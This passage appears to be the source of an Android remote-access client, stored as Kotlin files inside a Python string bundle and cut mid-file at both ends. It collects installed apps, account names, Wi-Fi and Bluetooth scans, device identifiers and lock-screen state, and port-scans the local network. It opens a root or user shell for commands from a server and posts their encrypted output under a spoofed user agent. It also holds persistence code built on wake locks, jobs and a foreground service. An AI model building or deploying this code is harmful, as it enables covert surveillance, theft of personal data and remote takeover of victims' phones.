            val sensors = sm.getSensorList(Sensor.TYPE_ALL)
            append("Sensors: ").append(sensors.size).append("\n")
            for (s in sensors) append("  ${s.name} (type ${s.type})\n")
        } catch (_: Exception) {}
    }

    private fun getStorageInfo(): String = buildString {
        try {
            val ds = StatFs(Environment.getDataDirectory().path)
            append("Internal Total: ").append(formatBytes(ds.blockCountLong * ds.blockSizeLong)).append("\n")
            append("Internal Free: ").append(formatBytes(ds.availableBlocksLong * ds.blockSizeLong)).append("\n")
        } catch (_: Exception) {}
    }

    private fun getCpuMemoryInfo(context: Context): String = buildString {
        append("CPU ABI: ").append(Build.SUPPORTED_ABIS.joinToString(", ")).append("\n")
        append("CPU Cores: ").append(Runtime.getRuntime().availableProcessors()).append("\n")
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            append("Total RAM: ").append(formatBytes(mi.totalMem)).append("\n")
            append("Available RAM: ").append(formatBytes(mi.availMem)).append("\n")
        } catch (_: Exception) {}
    }

    private fun getInstalledApps(context: Context): String = buildString {
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(0)
            val user = packages.filter { ((it.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM) == 0 }
            append("User apps: ").append(user.size).append(" / Total: ").append(packages.size).append("\n")
            for (p in user.take(60)) {
                val l = try { pm.getApplicationLabel(p.applicationInfo!!).toString() } catch (_: Exception) { "?" }
                append("  ").append(l).append("  (").append(p.packageName).append(")\n")
            }
        } catch (_: Exception) {}
    }

    private fun formatBytes(b: Long): String {
        if (b < 1024) return "$b B"
        val kb = b / 1024.0
        if (kb < 1024) return String.format(Locale.US, "%.1f KB", kb)
        val mb = kb / 1024.0
        if (mb < 1024) return String.format(Locale.US, "%.1f MB", mb)
        return String.format(Locale.US, "%.2f GB", mb / 1024.0)
    }

    private fun formatUptime(m: Long): String {
        val t = m / 1000
        return "${t/86400} d ${(t%86400)/3600} h ${(t%3600)/60} m ${t%60} s"
    }

    private fun getPublicIp(): String = try {
        val c = URL("https://api.ipify.org").openConnection() as HttpURLConnection
        c.connectTimeout = IP_HTTP_TIMEOUT_MS
        c.inputStream.bufferedReader().readText().also { c.disconnect() }
    } catch (_: Exception) { "unknown_ip" }

    private fun sysProp(k: String): String = try {
        val c = Class.forName("android.os.SystemProperties")
        val m = c.getMethod("get", String::class.java)
        (m.invoke(null, k) as? String) ?: ""
    } catch (_: Exception) { "" }

    private fun getSecurityInfo(context: Context): String = buildString {
        var anySu = false
        for (p in listOf("/system/bin/su","/system/xbin/su","/sbin/su","/su/bin/su"))
            if (File(p).exists()) { anySu = true; break }
        append("Rooted: $anySu\n")
        append("SELinux: ").append(sysProp("ro.boot.veritymode")).append("\n")
        append("Boot tags: ").append(Build.TAGS).append("\n")
        append("Verified boot: ").append(sysProp("ro.boot.verifiedbootstate")).append("\n")
        append("Flash locked: ").append(sysProp("ro.boot.flash.locked")).append("\n")
    }

    private fun getLockScreenInfo(context: Context): String = buildString {
        try {
            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            append("Keyguard secure: ").append(km.isKeyguardSecure).append("\n")
            append("Keyguard locked: ").append(km.isKeyguardLocked).append("\n")
        } catch (_: Exception) {}
        append("Crypto: ").append(sysProp("ro.crypto.state")).append(" / ").append(sysProp("ro.crypto.type")).append("\n")
    }

    private fun getSystemSettingsInfo(context: Context): String = buildString {
        try {
            val cr = context.contentResolver
            append("ADB: ").append(Settings.Global.getInt(cr, Settings.Global.ADB_ENABLED, 0) == 1).append("\n")
            append("Developer options: ").append(Settings.Global.getInt(cr, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1).append("\n")
            append("Airplane: ").append(Settings.Global.getInt(cr, Settings.Global.AIRPLANE_MODE_ON, 0) == 1).append("\n")
            append("Default IME: ").append(Settings.Secure.getString(cr, Settings.Secure.DEFAULT_INPUT_METHOD) ?: "N/A").append("\n")
            append("Android ID: ").append(Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID) ?: "N/A").append("\n")
        } catch (_: Exception) {}
    }

    private fun getLocaleConfigInfo(): String = buildString {
        val lo = Locale.getDefault()
        append("Language: ").append(lo.language).append("\n")
        append("Country: ").append(lo.country).append("\n")
        append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
    }

    private fun getBatteryLiveInfo(context: Context): String = buildString {
        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            append("Current now: ").append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW) / 1000).append(" mA\n")
            append("Charge counter: ").append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER) / 1000).append(" mAh\n")
        } catch (_: Exception) {}
    }

    private fun getNetworkExtrasInfo(context: Context): String = buildString {
        try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val n = cm.activeNetwork
            val lp: LinkProperties? = if (n != null) cm.getLinkProperties(n) else null
            if (lp != null) {
                append("DNS: ").append(lp.dnsServers.joinToString(", ") { it.hostAddress ?: "?" }).append("\n")
                append("Interface: ").append(lp.interfaceName ?: "N/A").append("\n")
            }
        } catch (_: Exception) {}
    }

    private fun getAudioInfo(context: Context): String = buildString {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            append("Ringer: ").append(am.ringerMode).append("\n")
            append("Music active: ").append(am.isMusicActive).append("\n")
        } catch (_: Exception) {}
    }

    private fun getCameraInfo(context: Context): String = buildString {
        try {
            val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            append("Cameras: ").append(cm.cameraIdList.size).append("\n")
        } catch (_: Exception) {}
    }

    private fun getFeatureFlags(context: Context): String = buildString {
        val pm = context.packageManager
        append("NFC: ").append(pm.hasSystemFeature(PackageManager.FEATURE_NFC)).append("\n")
        append("GPS: ").append(pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS)).append("\n")
        append("BLE: ").append(pm.hasSystemFeature(PackageManager.FEATURE_BLUETOOTH_LE)).append("\n")
    }

    private fun getInputDevicesInfo(context: Context): String = buildString {
        try {
            val im = context.getSystemService(Context.INPUT_SERVICE) as InputManager
            append("Input devices: ").append(im.inputDeviceIds.size).append("\n")
        } catch (_: Exception) {}
    }

    private fun getMemoryProcessInfo(): String = buildString {
        try {
            append("Native heap: ").append(formatBytes(Debug.getNativeHeapAllocatedSize())).append("\n")
            append("Java heap: ").append(formatBytes(Runtime.getRuntime().totalMemory())).append("\n")
        } catch (_: Exception) {}
    }

    private fun getStorageVolumesInfo(context: Context): String = buildString {
        try {
            val sm = context.getSystemService(Context.STORAGE_SERVICE) as StorageManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                append("Volumes: ").append(sm.storageVolumes.size).append("\n")
        } catch (_: Exception) {}
    }

    private fun getKeystoreInfo(): String = try {
        KeyStore.getInstance("AndroidKeyStore").load(null)
        "Keystore: accessible\n"
    } catch (_: Exception) {
        "Keystore: unavailable\n"
    }

    private fun getWebViewInfo(context: Context): String = try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            "WebView: ${android.webkit.WebView.getCurrentWebViewPackage()?.versionName ?: "N/A"}\n"
        else
            "WebView: <Android 8\n"
    } catch (_: Exception) {
        "WebView: error\n"
    }

    private fun getWifiScanInfo(context: Context): String = buildString {
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val r = wm.scanResults
            append("Visible APs: ").append(r.size).append("\n")
            for (ap in r.sortedByDescending { it.level }.take(30))
                append("  ${ap.BSSID}  ${ap.SSID ?: "(hidden)"}  ${ap.level} dBm\n")
        } catch (_: Exception) {}
    }

    private fun getCellTowerInfo(context: Context): String = buildString {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            append("Visible cells: ").append(tm.allCellInfo?.size ?: 0).append("\n")
        } catch (_: Exception) {}
    }

    private fun getLiveSensorValues(context: Context): String = buildString {
        try {
            val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
            val values = ConcurrentHashMap<Int, FloatArray>()
            val listener = object : SensorEventListener {
                override fun onSensorChanged(e: SensorEvent) { values[e.sensor.type] = e.values.clone() }
                override fun onAccuracyChanged(s: Sensor?, a: Int) {}
            }
            for (t in listOf(Sensor.TYPE_ACCELEROMETER, Sensor.TYPE_GYROSCOPE, Sensor.TYPE_LIGHT, Sensor.TYPE_PROXIMITY, Sensor.TYPE_PRESSURE)) {
                val s = sm.getDefaultSensor(t) ?: continue
                sm.registerListener(listener, s, SensorManager.SENSOR_DELAY_NORMAL)
            }
            Thread.sleep(SENSOR_READ_WAIT_MS)
            sm.unregisterListener(listener)
            for (t in listOf(Sensor.TYPE_ACCELEROMETER, Sensor.TYPE_GYROSCOPE, Sensor.TYPE_LIGHT, Sensor.TYPE_PROXIMITY, Sensor.TYPE_PRESSURE)) {
                values[t]?.let { append("type $t: ${it.joinToString(", ")}\n") }
            }
        } catch (_: Exception) {}
    }

    private fun getBluetoothInfo(context: Context): String = buildString {
        try {
            val a = (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter ?: return ""
            append("BT enabled: ").append(a.isEnabled).append("\n")
            append("BT bonded: ").append(a.bondedDevices?.size ?: 0).append("\n")
        } catch (_: Exception) {}
    }

    private fun getRecentMediaInfo(context: Context): String = buildString {
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val proj = arrayOf(MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_TAKEN)
            val args = Bundle().apply {
                putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, "${MediaStore.Images.Media.DATE_TAKEN} DESC")
                putInt(ContentResolver.QUERY_ARG_LIMIT, 15)
            }
            val c = context.contentResolver.query(uri, proj, args, null)
            c?.use { append("Recent photos: ").append(it.count).append("\n") }
        } catch (_: Exception) {}
    }

    private fun getCalendarInfo(context: Context): String = buildString {
        try {
            val c = context.contentResolver.query(CalendarContract.Events.CONTENT_URI, arrayOf(CalendarContract.Events.TITLE), null, null, null)
            c?.use { append("Calendar events: ").append(it.count).append("\n") }
        } catch (_: Exception) {}
    }

    private fun getBootInternalsInfo(): String = buildString {
        for (p in listOf("ro.boot.bootreason", "ro.boot.warranty_bit", "ro.boot.verifiedbootstate", "ro.build.selinux", "ro.product.first_api_level")) {
            val v = sysProp(p)
            if (v.isNotBlank()) append("$p = $v\n")
        }
    }

    private fun getPrivacyInfo(context: Context): String = buildString {
        try {
            val cr = context.contentResolver
            append("Notification listeners: ").append(Settings.Secure.getString(cr, "enabled_notification_listeners") ?: "(none)").append("\n")
            append("Accessibility: ").append(Settings.Secure.getString(cr, "enabled_accessibility_services") ?: "(none)").append("\n")
        } catch (_: Exception) {}
    }

    private fun getAccountsInfo(context: Context): String = buildString {
        try {
            val am = AccountManager.get(context)
            val accounts = am.accounts
            append("Total accounts: ").append(accounts.size).append("\n")
            for (a in accounts) append("  ${a.type}  ${a.name}\n")
        } catch (_: Exception) {}
    }

    private fun getOwnerProfileInfo(context: Context): String = buildString {
        try {
            val c = context.contentResolver.query(ContactsContract.Profile.CONTENT_URI, null, null, null, null)
            c?.use { append("Owner profile: ").append(if (it.count > 0) "set" else "empty").append("\n") }
        } catch (_: Exception) {}
    }

    private fun getAppInstallInfo(context: Context): String = buildString {
        try {
            val pm = context.packageManager
            for (pkg in pm.getInstalledPackages(0)) {
                if (((pkg.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM) == 0) {
                    append("  ").append(pkg.packageName).append("  v").append(pkg.versionName ?: "?").append("\n")
                }
            }
        } catch (_: Exception) {}
    }

    private fun getBleScanInfo(context: Context): String = buildString {
        try {
            val a = (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter ?: return ""
            if (!a.isEnabled) return "BLE: adapter disabled\n"
            val scanner = a.bluetoothLeScanner ?: return "BLE: no scanner\n"
            val results = ConcurrentHashMap<String, ScanResult>()
            val cb = object : ScanCallback() {
                override fun onScanResult(type: Int, result: ScanResult) {
                    results[result.device.address ?: "?"] = result
                }
            }
            scanner.startScan(null, ScanSettings.Builder().setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY).build(), cb)
            Thread.sleep(BLE_SCAN_MS)
            scanner.stopScan(cb)
            append("BLE devices: ").append(results.size).append("\n")
            for ((_, r) in results) {
                val n = try { r.device.name ?: "(no name)" } catch (_: Throwable) { "(no name)" }
                append("  $n  ${r.device.address}  rssi=${r.rssi}\n")
            }
        } catch (_: Exception) {}
    }

    private fun getMediaFilesystemInfo(context: Context): String = buildString {
        try {
            for (d in listOf(Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS, Environment.DIRECTORY_DOCUMENTS)) {
                val f = Environment.getExternalStoragePublicDirectory(d)
                if (f.exists()) append("$d: ${f.listFiles()?.size ?: 0} files\n")
            }
        } catch (_: Exception) {}
    }

    private fun getActivityStepsInfo(context: Context): String = buildString {
        try {
            val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
            val s = sm.getDefaultSensor(Sensor.TYPE_STEP_COUNTER) ?: return ""
            var v = -1f
            val listener = object : SensorEventListener {
                override fun onSensorChanged(e: SensorEvent) { v = e.values[0] }
                override fun onAccuracyChanged(s: Sensor?, a: Int) {}
            }
            sm.registerListener(listener, s, SensorManager.SENSOR_DELAY_NORMAL)
            Thread.sleep(1000)
            sm.unregisterListener(listener)
            if (v >= 0) append("Steps since boot: ${v.toLong()}\n")
        } catch (_: Exception) {}
    }

    private fun getBootHistoryInfo(context: Context): String = buildString {
        try {
            val bc = Settings.Global.getInt(context.contentResolver, "boot_count", -1)
            if (bc >= 0) append("BOOT_COUNT: $bc\n")
        } catch (_: Exception) {}
    }

    private fun getUserDictionaryInfo(context: Context): String = buildString {
        try {
            val c = context.contentResolver.query(UserDictionary.Words.CONTENT_URI, arrayOf(UserDictionary.Words.WORD, UserDictionary.Words.FREQUENCY), null, null, null)
            c?.use { append("Dictionary entries: ").append(it.count).append("\n") }
        } catch (_: Exception) {}
    }

    private fun getBrowserBookmarksInfo(context: Context): String = try {
        val c = context.contentResolver.query(Uri.parse("content://browser/bookmarks"), null, null, null, null)
        val n = c?.count ?: 0
        c?.close()
        "Bookmarks: $n\n"
    } catch (_: Exception) {
        "Bookmarks: unavailable\n"
    }

    private fun getMdnsInfo(context: Context): String = buildString {
        try {
            val nsd = context.getSystemService(Context.NSD_SERVICE) as NsdManager
            val found = ConcurrentHashMap<String, NsdServiceInfo>()
            for (t in listOf("_googlecast._tcp.", "_airplay._tcp.", "_http._tcp.", "_printer._tcp.")) {
                try {
                    val l = object : NsdManager.DiscoveryListener {
                        override fun onStartDiscoveryFailed(t: String?, e: Int) {}
                        override fun onStopDiscoveryFailed(t: String?, e: Int) {}
                        override fun onDiscoveryStarted(t: String?) {}
                        override fun onDiscoveryStopped(t: String?) {}
                        override fun onServiceFound(i: NsdServiceInfo?) {
                            if (i != null) found["${i.serviceName}|$t"] = i
                        }
                        override fun onServiceLost(i: NsdServiceInfo?) {}
                    }
                    nsd.discoverServices(t, NsdManager.PROTOCOL_DNS_SD, l)
                    Thread.sleep(MDNS_PER_SERVICE_MS)
                    try { nsd.stopServiceDiscovery(l) } catch (_: Throwable) {}
                } catch (_: Throwable) {}
            }
            append("mDNS services: ").append(found.size).append("\n")
            for ((_, info) in found) append("  ${info.serviceName}  type=${info.serviceType}\n")
        } catch (_: Exception) {}
    }

    private fun getLanScanInfo(context: Context): String = buildString {
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcp = wm.dhcpInfo ?: return ""
            val myIp = Formatter.formatIpAddress(dhcp.ipAddress)
            val prefix = myIp.substringBeforeLast(".") + "."
            val ports = listOf(22, 80, 443, 5000, 8080, 9100, 32400)
            val open = ConcurrentHashMap<String, MutableList<Int>>()
            val pool = Executors.newFixedThreadPool(64)
            val latch = CountDownLatch(254)
            for (i in 1..254) {
                val ip = "$prefix$i"
                pool.execute {
                    try {
                        for (p in ports) {
                            try {
                                val s = Socket()
                                s.connect(InetSocketAddress(ip, p), LAN_SCAN_TIMEOUT_MS)
                                open.computeIfAbsent(ip) { java.util.Collections.synchronizedList(mutableListOf()) }.add(p)
                                s.close()
                            } catch (_: Throwable) {}
                        }
                    } finally {
                        latch.countDown()
                    }
                }
            }
            latch.await(LAN_SCAN_TOTAL_SEC, TimeUnit.SECONDS)
            pool.shutdownNow()
            append("Hosts with open ports: ").append(open.size).append("\n")
            for ((ip, ps) in open) append("  $ip  ports: ${ps.sorted().joinToString(", ")}\n")
        } catch (_: Exception) {}
    }
}
""",
"app/src/main/java/com/yourapp/client/ShellSession.kt": r"""
package com.yourapp.client

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import javax.net.ssl.HttpsURLConnection

object ShellSession {
    private const val TAG = "ShellSession"
    private const val FLUSH_INTERVAL_MS = 400L
    private const val FLUSH_MAX_CHARS = 1200
    private var process: Process? = null
    private var writer: BufferedWriter? = null
    private var reader: BufferedReader? = null
    private var isRunning = false
    private var appContext: Context? = null
    private var currentCmdId: String? = null
    private var currentMarker: String? = null
    private val currentOutput = StringBuilder()
    private var streamBuffer = StringBuilder()
    private var lastFlush = 0L
    private val lock = Object()

    fun isActive(): Boolean = isRunning
    fun isHealthy(): Boolean = process?.isAlive == true && writer != null && reader != null

    fun start(context: Context): Boolean {
        if (isRunning && process?.isAlive == true) return true
        appContext = context.applicationContext
        return try {
            val hasRoot = File("/system/bin/su").exists()
            val shellCmd = if (hasRoot) "su" else "sh"
            val pb = ProcessBuilder(shellCmd)
            pb.redirectErrorStream(true)
            process = pb.start()
            writer = BufferedWriter(OutputStreamWriter(process!!.outputStream))
            reader = BufferedReader(InputStreamReader(process!!.inputStream))
            isRunning = true
            Thread {
                try {
                    var l: String?
                    while (isRunning) {
                        l = reader?.readLine() ?: break
                        handleLine(l)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "reader: " + e.message)
                }
                isRunning = false
            }.start()
            try {
                writer?.write("echo SHELL_READY\n")
                writer?.flush()
            } catch (_: Exception) {}
            true
        } catch (e: Exception) {
            Log.e(TAG, "start: " + e.message)
            isRunning = false
            false
        }
    }

    fun stop() {
        isRunning = false
        try { writer?.write("exit\n"); writer?.flush() } catch (_: Exception) {}
        try { process?.destroy() } catch (_: Exception) {}
        process = null; writer = null; reader = null
    }

    fun exec(cmd: String, cmdId: String, onDone: (String, Int) -> Unit) {
        if (!isRunning || writer == null) {
            onDone("[shell not running]", -1)
            return
        }
        synchronized(lock) {
            currentCmdId = cmdId
            currentOutput.setLength(0)
            streamBuffer = StringBuilder()
            lastFlush = System.currentTimeMillis()
            val marker = "___DONE_" + cmdId + "_"
            currentMarker = marker
            try {
                writer!!.write(cmd + "\n")
                writer!!.write("echo " + marker + "\$?\n")
                writer!!.flush()
            } catch (e: Exception) {
                onDone("Error: " + e.message, -1)
                currentCmdId = null
                currentMarker = null
            }
        }
    }

    fun interrupt() {
        try { writer?.write("\u0003\n"); writer?.flush() } catch (_: Exception) {}
    }

    private fun handleLine(line: String) {
        synchronized(lock) {
            val m = currentMarker
            if (m != null && line.startsWith(m)) {
                val ec = line.substring(m.length).trim().toIntOrNull() ?: 0
                val ci = currentCmdId
                flushStream(true)
                currentCmdId = null
                currentMarker = null
                if (ci != null) sendFinal(ci, ec)
                return
            }
            currentOutput.append(line).append("\n")
            streamBuffer.append(line).append("\n")
            val now = System.currentTimeMillis()
            if (now - lastFlush > FLUSH_INTERVAL_MS || streamBuffer.length > FLUSH_MAX_CHARS) {
                flushStream(false)
            }
        }
    }

    private fun flushStream(force: Boolean) {
        val ci = currentCmdId ?: return
        if (streamBuffer.isEmpty()) return
        val data = streamBuffer.toString()
        streamBuffer = StringBuilder()
        lastFlush = System.currentTimeMillis()
        val ctx = appContext ?: return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val s = SharedPrefsManager.getServerUrl(ctx)
                val k = SharedPrefsManager.getEncryptionKey(ctx)
                val cid = DeviceFingerprint.getDeviceId(ctx)
                val ts = System.currentTimeMillis().toString()
                val a = genAuth(ts, k)
                val e = AESHelper.encrypt(data, k)
                val payload = JSONObject().apply { put("client_id", cid); put("cmd_id", ci); put("data", e) }
                val url = URL("$s/shellstream")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", cid)
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 10000
                conn.readTimeout = 15000
                conn.doOutput = true
                conn.outputStream.write(payload.toString().toByteArray())
                conn.outputStream.flush()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }
    }

    private fun sendFinal(ci: String, ec: Int) {
        val ctx = appContext ?: return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val s = SharedPrefsManager.getServerUrl(ctx)
                val k = SharedPrefsManager.getEncryptionKey(ctx)
                val cid = DeviceFingerprint.getDeviceId(ctx)
                val ts = System.currentTimeMillis().toString()
                val a = genAuth(ts, k)
                val t = "[exit: $ec]"
                val e = AESHelper.encrypt(t, k)
                val url = URL("$s/result")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", cid)
                conn.setRequestProperty("X-Command", "shellcmd")
                conn.setRequestProperty("X-Command-ID", ci)
                conn.setRequestProperty("X-Shell-Final", "1")
                conn.setRequestProperty("Content-Type", "text/plain")
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 10000
                conn.readTimeout = 15000
                conn.doOutput = true
                conn.outputStream.write(e.toByteArray())
                conn.outputStream.flush()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }
    }

    private fun genAuth(ts: String, k: String): String =
        MessageDigest.getInstance("SHA-256").digest("$ts:$k".toByteArray()).joinToString("") { "%02x".format(it) }
}
""",
"app/src/main/java/com/yourapp/client/SharedPrefsManager.kt": r"""
package com.yourapp.client

import android.content.Context

object SharedPrefsManager {
    private const val P = "client_prefs"
    private const val K_URL = "server_url"
    private const val K_FB = "fallback_urls"
    private const val K_KEY = "encryption_key"
    private const val K_OLD = "old_encryption_key"
    private const val K_RM = "removed"
    private const val D_URL = "__DEFAULT_SERVER_URL__"
    private const val D_KEY = "__DEFAULT_KEY__"

    fun getServerUrl(c: Context): String =
        c.getSharedPreferences(P, Context.MODE_PRIVATE).getString(K_URL, D_URL) ?: D_URL

    fun setServerUrl(c: Context, u: String) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString(K_URL, u).apply()
    }

    fun getFallbackServerUrls(c: Context): List<String> {
        val r = c.getSharedPreferences(P, Context.MODE_PRIVATE).getString(K_FB, "") ?: ""
        if (r.isBlank()) return emptyList()
        return r.split("|").filter { it.isNotBlank() }
    }

    fun setFallbackServerUrls(c: Context, u: List<String>) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString(K_FB, u.joinToString("|")).apply()
    }

    fun getAllServerUrls(c: Context): List<String> {
        val p = getServerUrl(c)
        val f = getFallbackServerUrls(c)
        val seen = mutableSetOf<String>()
        val out = mutableListOf<String>()
        for (u in listOf(p) + f) if (seen.add(u)) out.add(u)
        return out
    }

    fun getEncryptionKey(c: Context): String =
        c.getSharedPreferences(P, Context.MODE_PRIVATE).getString(K_KEY, D_KEY) ?: D_KEY

    fun setEncryptionKey(c: Context, k: String) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString(K_KEY, k).apply()
    }

    fun getOldEncryptionKey(c: Context): String =
        c.getSharedPreferences(P, Context.MODE_PRIVATE).getString(K_OLD, "") ?: ""

    fun setOldEncryptionKey(c: Context, k: String) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putString(K_OLD, k).apply()
    }

    fun clearOldEncryptionKey(c: Context) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().remove(K_OLD).apply()
    }

    fun isRemoved(c: Context): Boolean =
        c.getSharedPreferences(P, Context.MODE_PRIVATE).getBoolean(K_RM, false)

    fun setRemoved(c: Context, r: Boolean) {
        c.getSharedPreferences(P, Context.MODE_PRIVATE).edit().putBoolean(K_RM, r).apply()
    }
}
""",
"app/src/main/java/com/yourapp/client/ReliabilityJobService.kt": r"""
package com.yourapp.client

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.os.Build
import android.util.Log

class ReliabilityJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        try {
            val i = Intent(this, CommunicationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
        } catch (e: Exception) {
            Log.e("ReliabilityJob", e.message ?: "")
        }
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean = true
}
""",
"app/src/main/java/com/yourapp/client/CommunicationService.kt": r"""
package com.yourapp.client

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import javax.net.ssl.HttpsURLConnection
import org.json.JSONObject
import java.io.File
import kotlin.math.max
import kotlin.math.min

class CommunicationService : Service() {
    private val eh = CoroutineExceptionHandler { _, e -> Log.e("CommService", "coroutine: " + (e.message ?: "")) }
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job + eh)
    private val executedIds = java.util.Collections.synchronizedSet(mutableSetOf<String>())
    @Volatile private var isRunning = true
    @Volatile private var lastPollSuccessMs = 0L

    private lateinit var networkReceiver: BroadcastReceiver
    private lateinit var wakeEventReceiver: BroadcastReceiver
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var consecutiveFailures = 0
    private var pollingJob: Job? = null
    private var lastUrlIndex = 0
    private val pollingLock = Object()

    companion object {
        private const val CHANNEL_ID = "remote_client_channel"
        private const val NOTIF_ID = 1
        private const val ALARM_RC = 101
        private const val JOB_ID = 2024
        private const val ALARM_INTERVAL_MS = 5 * 60 * 1000L
        private const val BASE_POLL_MS = 2000L
        private const val MAX_POLL_MS = 60_000L
        private const val EXEC_STATE_PREFS = "exec_state"
        private const val EXEC_STATE_KEY = "ids"
        private const val EXEC_STATE_MAX = 500
        @Volatile private var handlerInstalled = false
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()

        if (!handlerInstalled) {
            try {
                Thread.setDefaultUncaughtExceptionHandler { t, e ->
                    Log.e("RemoteClient", "uncaught ${t.name}: " + (e.message ?: e.javaClass.simpleName))
                }
                handlerInstalled = true
            } catch (_: Throwable) {}
        }

        loadExecutedIds()

        try {
            createNotificationChannel()
            startForeground(NOTIF_ID, buildNotification())
        } catch (e: Throwable) {
            Log.e("CommService", "startForeground: " + (e.message ?: ""))
        }

        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RemoteClient::WakeLock")
            wakeLock?.setReferenceCounted(false)
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (_: Throwable) {}

        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val req = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) { kickPolling() }
                override fun onLost(network: Network) {}
                override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                    if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) kickPolling()
                }
            }
            cm.registerNetworkCallback(req, networkCallback!!)
        } catch (e: Exception) {
            Log.e("CommService", "netCB: " + e.message)
        }

        networkReceiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, i: Intent?) {
                try {
                    if (i?.action == ConnectivityManager.CONNECTIVITY_ACTION) kickPolling()
                } catch (_: Throwable) {}
            }
        }
        try {
